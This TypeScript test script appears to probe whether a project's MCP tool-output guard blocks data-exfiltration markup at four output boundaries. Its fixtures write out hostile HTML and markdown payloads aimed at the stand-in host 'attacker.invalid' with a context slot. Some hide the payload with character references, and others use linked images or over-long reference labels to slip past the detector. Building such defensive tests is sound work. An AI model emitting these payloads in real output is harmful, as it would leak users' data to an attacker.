// T72 — the four public boundaries, for this round's rows.
//
// Three questions:
//   1. Are T66#F-001's seven gate spellings and T66#F-002's three markdown forms
//      now CLOSED at dispatchCallTool, prepareOutputForPersistence,
//      validateOutputForTransport and redactToolOutput — not only in the
//      detector? (A probe that calls a pure function cannot observe a fix made
//      at its call site, and the converse: a detector fix must be shown to
//      survive the call sites.)
//   2. Do THIS round's new classes — the linked image and the >999-character
//      reference label — reach a model client with `redaction.state:"none"`?
//   3. Do the exactness negatives stay RELEASED, and does the mask still land on
//      the RAW bytes?
//
// Advisory redaction is OFF, so what is measured is the MANDATORY floor.
// Read-only, offline, synthetic hosts only.
// Usage: bun T72-boundary.ts [out.json]
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const CDN = "cdn.example.org";
const LONG = "L".repeat(1200);

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

type Shape = { text: string; kind: "hostile" | "benign"; why: string };

const shapes: Record<string, Shape> = {
  // ---- T66#F-001: the seven gate spellings, now claimed closed --------------
  g1InputDecimal: { text: `<input type="&#105;mage" src="${U}">`, kind: "hostile", why: "decimal ref in type" },
  g2InputHex: { text: `<input type="&#x69;mage" src="${U}">`, kind: "hostile", why: "hex ref in type" },
  g3InputTrailing: { text: `<input type="imag&#101;" src="${U}">`, kind: "hostile", why: "ref at the end of type" },
  g4InputNoSemi: { text: `<input type="&#105mage" src="${U}">`, kind: "hostile", why: "no trailing semicolon" },
  g5MetaDecimal: { text: `<meta http-equiv="&#114;efresh" content="0;url=${U}">`, kind: "hostile", why: "decimal ref in http-equiv" },
  g6MetaHex: { text: `<meta http-equiv="&#x72;efresh" content="0;url=${U}">`, kind: "hostile", why: "hex ref in http-equiv" },
  g7MetaTrailing: { text: `<meta http-equiv="refres&#104;" content="0;url=${U}">`, kind: "hostile", why: "ref at the end of http-equiv" },
  g8InputNamed: { text: `<input type="&#0000105;mage" src="${U}">`, kind: "hostile", why: "padded decimal ref" },
  g9InputUnquoted: { text: `<input type=&#105;mage src="${U}">`, kind: "hostile", why: "unquoted value, tokenizer decodes it too" },

  // ---- T66#F-002: the three markdown forms, now claimed closed -------------
  m1Collapsed: { text: `![a][]\n\n[a]: ${U}\n`, kind: "hostile", why: "collapsed reference image" },
  m2Shortcut: { text: `![a]\n\n[a]: ${U}\n`, kind: "hostile", why: "shortcut reference image" },
  m3NestedBrackets: { text: `![a[b]c](${U})`, kind: "hostile", why: "balanced brackets in the description" },
  m4Full: { text: `![a][a]\n\n[a]: ${U}\n`, kind: "hostile", why: "full reference image (baseline)" },
  m5Inline: { text: `![a](${U})`, kind: "hostile", why: "inline image (baseline)" },

  // ---- T72: this round's classes -------------------------------------------
  x1LinkedInlineImage: {
    text: `[![build](${U})](https://ci.example.com/job)`,
    kind: "hostile",
    why: "T72: image inside a link — the README badge shape; marked renders <img src=attacker>",
  },
  x2LinkedShortcutImage: {
    text: `[![build]](https://ci.example.com/job)\n\n[build]: ${U}\n`,
    kind: "hostile",
    why: "T72: shortcut reference image inside a link",
  },
  x3LinkedImageInProse: {
    text: `Status: [![b](${U})](https://ci.example.com/job) — green.\n`,
    kind: "hostile",
    why: "T72: same, in prose",
  },
  x4LongLabelFullRef: {
    text: `![a][${LONG}]\n\n[${LONG}]: ${U}\n`,
    kind: "hostile",
    why: "T72: reference label past MAX_REFERENCE_LABEL; marked resolves it, the old pattern flagged it",
  },
  x5LongLabelShortcut: {
    text: `![${LONG}]\n\n[${LONG}]: ${U}\n`,
    kind: "hostile",
    why: "T72: shortcut label past MAX_REFERENCE_LABEL",
  },

  // ---- exactness negatives: must stay RELEASED -----------------------------
  n1MetaRefreshSemi: { text: `<meta http-equiv="refresh&#59;" content="0;url=${U}">`, kind: "benign", why: "decodes to `refresh;` — no renderer refreshes on it" },
  n2InputTypeImages: { text: `<input type="&#105;mages" src="${U}">`, kind: "benign", why: "decodes to `images` — not the gate value" },
  n3InputTypeText: { text: `<input type="text" src="${U}">`, kind: "benign", why: "src on a text input fetches nothing" },
  n4MetaContentType: { text: `<meta http-equiv="content-type" content="0;url=${U}">`, kind: "benign", why: "not a refresh" },
  n5InputNoType: { text: `<input src="${U}">`, kind: "benign", why: "no type at all" },

  // ---- AC5's third clause ---------------------------------------------------
  a1PublicLink: { text: "[public documentation](https://docs.example.org/guide)", kind: "benign", why: "AC5: a public markdown link is not a network send" },
  a2RelativeImage: { text: `![a](/assets/logo.png)`, kind: "benign", why: "relative destination stays released" },
  a3AllowlistedImg: { text: `<img src="https://${CDN}/logo.png">`, kind: "benign", why: "external but on the CDN host used for the allowlist check" },
};

const cwd = process.cwd();

const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, shape]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: shape.text }),
  })),
};

type Result = {
  id: string;
  kind: string;
  detectorFindings: number;
  mcpState: string;
  mcpIsError: boolean;
  mcpLeaksHost: boolean;
  persistLeaksHost: boolean;
  persistByteIdentical: boolean;
  transportLeaksHost: boolean;
  transportState: string;
  seamLeaksHost: boolean;
  why: string;
};

const results: Result[] = [];
for (const [name, shape] of Object.entries(shapes)) {
  const host = shape.kind === "hostile" ? ATT : shape.text.includes(ATT) ? ATT : CDN;
  const serialized = JSON.stringify({ note: shape.text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: shape.text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  results.push({
    id: name,
    kind: shape.kind,
    detectorFindings: detectExfil(shape.text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    mcpIsError: call.isError === true,
    mcpLeaksHost: JSON.stringify(call).includes(host),
    persistLeaksHost: persisted.allowed ? persisted.content.includes(host) : false,
    persistByteIdentical: persisted.allowed ? persisted.content === serialized : false,
    transportLeaksHost: transported.text.includes(host),
    transportState: transported.redaction.state,
    seamLeaksHost: seamText.includes(host),
    why: shape.why,
  });
}

for (const r of results) {
  console.log(
    `${r.id.padEnd(24)} ${r.kind.padEnd(8)} n=${String(r.detectorFindings).padEnd(2)} mcp[state=${r.mcpState} err=${r.mcpIsError} leak=${r.mcpLeaksHost}] persist[leak=${r.persistLeaksHost} identical=${r.persistByteIdentical}] transport[state=${r.transportState} leak=${r.transportLeaksHost}] seam[leak=${r.seamLeaksHost}]`,
  );
}

// ---- the mask still lands on the RAW bytes --------------------------------
const maskRows: { id: string; redacted: string; rawSpellingPreserved: boolean }[] = [];
for (const id of ["g1InputDecimal", "g3InputTrailing", "g5MetaDecimal", "g9InputUnquoted", "m3NestedBrackets"]) {
  const text = shapes[id]!.text;
  const out = applyRedaction(text, detectExfil(text, [])) as unknown;
  const redacted =
    typeof out === "string" ? out : ((out as { text?: string }).text ?? String(out));
  maskRows.push({
    id,
    redacted,
    // the gate's own raw spelling must survive: only the destination is masked
    rawSpellingPreserved:
      (id.startsWith("g") ? redacted.includes(text.slice(text.indexOf("=") + 1, text.indexOf(" src") > 0 ? text.indexOf(" src") : text.indexOf(" content"))) : true) &&
      !redacted.includes(ATT),
  });
}
for (const r of maskRows) console.log(`MASK ${r.id.padEnd(20)} rawGateSpellingPreserved=${r.rawSpellingPreserved} -> ${r.redacted}`);

const allowlisted = detectExfil(shapes.a3AllowlistedImg!.text, [CDN]);
const notAllowlisted = detectExfil(shapes.a3AllowlistedImg!.text, []);

const hostileLeaking = results.filter(
  (r) =>
    r.kind === "hostile" &&
    (r.mcpLeaksHost || r.persistLeaksHost || r.transportLeaksHost || r.seamLeaksHost),
);
const summary = {
  shapes: results.length,
  hostileLeakingAtAnyBoundary: hostileLeaking.map((r) => r.id),
  hostileLeakingCount: hostileLeaking.length,
  hostileFullyClosed: results.filter(
    (r) =>
      r.kind === "hostile" &&
      !r.mcpLeaksHost &&
      !r.persistLeaksHost &&
      !r.transportLeaksHost &&
      !r.seamLeaksHost,
  ).length,
  leakingWithStateNone: hostileLeaking.filter((r) => r.mcpState === "none").map((r) => r.id),
  exactnessNegativesStillReleased: results
    .filter((r) => r.id.startsWith("n") && r.mcpState === "none" && r.detectorFindings === 0)
    .map((r) => r.id),
  exactnessNegativesFlagged: results
    .filter((r) => r.id.startsWith("n") && r.detectorFindings > 0)
    .map((r) => r.id),
  ac5PublicLinkReleased: results.find((r) => r.id === "a1PublicLink")?.mcpState === "none",
  ac5RelativeReleased: results.find((r) => r.id === "a2RelativeImage")?.mcpState === "none",
  maskLandsOnRawBytes: maskRows.every((r) => r.rawSpellingPreserved),
  allowlistRemedyWorks: notAllowlisted.length > 0 && allowlisted.length === 0,
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, results, maskRows }, null, 2));
